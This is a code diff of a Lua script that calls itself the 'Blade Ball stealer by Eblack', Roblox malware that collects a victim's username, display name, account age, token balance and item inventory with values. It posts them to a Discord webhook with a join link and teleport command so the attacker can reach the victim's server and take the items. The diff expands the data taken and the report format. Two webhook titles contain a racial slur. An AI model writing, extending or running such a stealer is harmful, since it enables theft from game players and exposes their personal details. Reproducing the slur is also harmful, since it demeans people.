@@ -147,28 +147,13 @@ end
 local totalRAP = 0
 
 local function SendJoinMessage(list, prefix)
-    local fields = {
-        {
-            name = "Victim Username 🤖:",
-            value = plr.Name,
-            inline = true
-        },
-        {
-            name = "Join link 🔗:",
-            value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId
-        },
-        {
-            name = "Item list 📝:",
-            value = "",
-            inline = false
-        },
-        {
-            name = "Summary 💰:",
-            value = string.format("Total RAP: %s", formatNumber(totalRAP)),
-            inline = false
-        }
-    }
+    -- On récupère les tokens de la victime
+    local tokensEmbed = "0"
+    pcall(function()
+        tokensEmbed = PlayerGui.Main.Currency.Coins.Amount.Text:gsub("[^%d]", "")
+    end)
 
+    -- Ta logique originale pour grouper les items
     local grouped = {}
     for _, item in ipairs(list) do
         if grouped[item.Name] then
@@ -192,39 +177,63 @@ local function SendJoinMessage(list, prefix)
         return a.TotalRAP > b.TotalRAP
     end)
 
+    local itemListText = ""
     for _, group in ipairs(groupedList) do
         local itemLine = string.format("%s (x%s) - %s RAP", group.Name, group.Count, formatNumber(group.TotalRAP))
-        fields[3].value = fields[3].value .. itemLine .. "\n"
+        itemListText = itemListText .. itemLine .. "\n"
     end
 
-    if #fields[3].value > 1024 then
-        local lines = {}
-        for line in fields[3].value:gmatch("[^\r\n]+") do
-            table.insert(lines, line)
-        end
-
-        while #fields[3].value > 1024 and #lines > 0 do
-            table.remove(lines)
-            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
-        end
+    -- Limite de caractères pour Discord
+    if #itemListText > 1000 then
+        itemListText = string.sub(itemListText, 1, 950) .. "\nPlus more..."
     end
 
     local data = {
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["auth_token"] = auth_token, 
-		["embeds"] = {{
-            ["title"] = "🟣 Bro join your hit nigga 🎯",
-            ["color"] = 8323327,
-            ["fields"] = fields,
+        ["embeds"] = {{
+            ["title"] = "🟡 Pending Hit ... | ⚔️ Blade Ball Stealer",
+            ["color"] = 16763904,
+            ["fields"] = {
+                {
+                    ["name"] = "ℹ️ Player info:",
+                    ["value"] = "```" ..
+                        "\n🆔 Username      : " .. plr.Name ..
+                        "\n👤 Display Name  : " .. plr.DisplayName ..
+                        "\n🗓️ Account Age   : " .. plr.AccountAge .. " Days" ..
+                        "\n⚡ Executor      : " .. (identifyexecutor and identifyexecutor() or "Unknown") ..
+                        "\n🪙 Tokens        : " .. formatNumber(tonumber(tokensEmbed)) ..
+                        "```",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Item list 📝:",
+                    ["value"] = "```\n" .. (itemListText ~= "" and itemListText or "No items") .. "```",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Summary 💰:",
+                    ["value"] = "```\nTotal RAP: " .. formatNumber(totalRAP) .. "```",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "🔗 Quick Links", 
+                    ["value"] = "[**JOIN SERVER**](https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId .. ") | [**VIEW INVENTORY**](https://www.roblox.com/users/"..plr.UserId.."/inventory)", 
+                    ["inline"] = false
+                }
+            },
             ["footer"] = {
-                ["text"] = "Blade Ball stealer by Eblack"
+                ["text"] = "Blade Ball stealer by Eblack • " .. os.date("%X")
+            },
+            ["thumbnail"] = {
+                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
             }
         }}
     }
+
     local body = HttpService:JSONEncode(data)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
+    local headers = {["Content-Type"] = "application/json"}
+    
     local response = request({
         Url = webhook,
         Method = "POST",
@@ -234,24 +243,7 @@ local function SendJoinMessage(list, prefix)
 end
 
 local function SendMessage(list)
-    local fields = {
-		{
-			name = "Victim Username 🤖:",
-			value = plr.Name,
-			inline = true
-		},
-		{
-			name = "Items sent 📝:",
-			value = "",
-			inline = false
-		},
-        {
-            name = "Summary 💰:",
-            value = string.format("Total RAP: %s", formatNumber(totalRAP)),
-            inline = false
-        }
-	}
-
+    -- Groupement des items (ta logique originale)
     local grouped = {}
     for _, item in ipairs(list) do
         if grouped[item.Name] then
@@ -275,38 +267,51 @@ local function SendMessage(list)
         return a.TotalRAP > b.TotalRAP
     end)
 
+    local itemListSent = ""
     for _, group in ipairs(groupedList) do
         local itemLine = string.format("%s (x%s) - %s RAP", group.Name, group.Count, formatNumber(group.TotalRAP))
-        fields[2].value = fields[2].value .. itemLine .. "\n"
+        itemListSent = itemListSent .. itemLine .. "\n"
     end
 
-    if #fields[2].value > 1024 then
-        local lines = {}
-        for line in fields[2].value:gmatch("[^\r\n]+") do
-            table.insert(lines, line)
-        end
-
-        while #fields[2].value > 1024 and #lines > 0 do
-            table.remove(lines)
-            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
-        end
+    -- Gestion de la limite de caractères
+    if #itemListSent > 1000 then
+        itemListSent = string.sub(itemListSent, 1, 950) .. "\nPlus more..."
     end
 
     local data = {
         ["embeds"] = {{
-            ["title"] = "🟣 The nigga is on the server 🎉" ,
+            ["title"] = "🟣 The nigga is on the server 🎉",
+            ["description"] = "Le transfert va commencer ou est en cours !",
             ["color"] = 8323327,
-			["fields"] = fields,
-			["footer"] = {
-				["text"] = "Blade Ball stealer by Eblack"
-			}
+            ["fields"] = {
+                {
+                    ["name"] = "👤 Victim:",
+                    ["value"] = "```" .. plr.Name .. " (" .. plr.DisplayName .. ")```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "💰 Summary:",
+                    ["value"] = "```Total RAP: " .. formatNumber(totalRAP) .. "```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Items sent 📝:",
+                    ["value"] = "```\n" .. (itemListSent ~= "" and itemListSent or "No items found") .. "```",
+                    ["inline"] = false
+                }
+            },
+            ["footer"] = {
+                ["text"] = "Blade Ball stealer by Eblack • Success Log"
+            },
+            ["thumbnail"] = {
+                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
+            }
         }}
     }
 
     local body = HttpService:JSONEncode(data)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
+    local headers = {["Content-Type"] = "application/json"}
+    
     local response = request({
         Url = webhook,
         Method = "POST",
